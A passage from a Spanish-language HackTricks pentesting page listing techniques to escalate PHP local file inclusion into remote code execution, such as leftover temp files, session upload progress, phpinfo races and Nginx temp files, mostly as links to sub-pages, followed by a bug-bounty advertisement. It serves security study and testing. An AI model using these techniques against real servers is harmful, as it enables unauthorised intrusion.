**Cargue** un archivo que se almacenará como **temporal** en `/tmp`, luego en la **misma solicitud,** provoque una **falla de segmentación**, y luego el **archivo temporal no se eliminará** y podrá buscarlo.

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### A través del almacenamiento de archivos temporales de Nginx

Si encuentra una **Inclusión Local de Archivos** y **Nginx** se está ejecutando frente a PHP, es posible que pueda obtener RCE con la siguiente técnica:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### A través de PHP\_SESSION\_UPLOAD\_PROGRESS

Si encuentra una **Inclusión Local de Archivos** incluso si **no tiene una sesión** y `session.auto_start` está en `Off`. Si proporciona **`PHP_SESSION_UPLOAD_PROGRESS`** en los datos **multipart POST**, PHP **habilitará la sesión por usted**. Podría abusar de esto para obtener RCE:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### A través de la carga de archivos temporales en Windows

Si encuentra una **Inclusión Local de Archivos** y el servidor se está ejecutando en **Windows**, es posible que obtenga RCE:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### A través de phpinfo() (file\_uploads = on)

Si encuentra una **Inclusión Local de Archivos** y un archivo que expone **phpinfo()** con file\_uploads = on, puede obtener RCE:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### A través de compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Divulgación de ruta

Si encuentra una **Inclusión Local de Archivos** y puede **filtrar la ruta** del archivo temporal PERO el **servidor** está **verificando** si el **archivo a incluir tiene marcas PHP**, puede intentar **burlar esa verificación** con esta **Condición de Carrera**:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### A través de espera eterna + fuerza bruta

Si puede abusar de la LFI para **cargar archivos temporales** y hacer que el servidor **se detenga** la ejecución de PHP, luego podría **probar nombres de archivo durante horas** para encontrar el archivo temporal:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### Hasta el error fatal

Si incluye cualquiera de los archivos `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Debe incluir el mismo dos veces para generar ese error).

**No sé cómo es útil, pero podría serlo.**\
_Incluso si causa un Error Fatal de PHP, los archivos temporales cargados de PHP se eliminan._

<figure><img src="../../.gitbook/assets/image (1) (5).png" alt=""><figcaption></figcaption></figure>

## Referencias

[PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\
[PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof es el hogar de todas las recompensas por errores de criptografía.**

**Obtenga recompensas sin demoras**\
Las recompensas de HackenProof se lanzan solo cuando sus clientes depositan el presupuesto de recompensa. Recibirá la recompensa después de que se verifique el error.

**Obtenga experiencia en pentesting web3**\
¡Los protocolos blockchain y los contratos inteligentes son el nuevo Internet! Domine la seguridad web3 en sus días de crecimiento.

**Conviértase en la leyenda del hacker web3**\
Obtenga puntos de reputación con cada error verificado y conquiste la cima de la clasificación semanal.

[**Regístrese en HackenProof**](https://hackenproof.com/register) ¡comience a ganar con sus hacks!

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabaja en una **empresa de ciberseguridad**? ¿Quiere ver su **empresa anunciada en HackTricks**? ¿O quiere tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulte los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* Obtenga el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
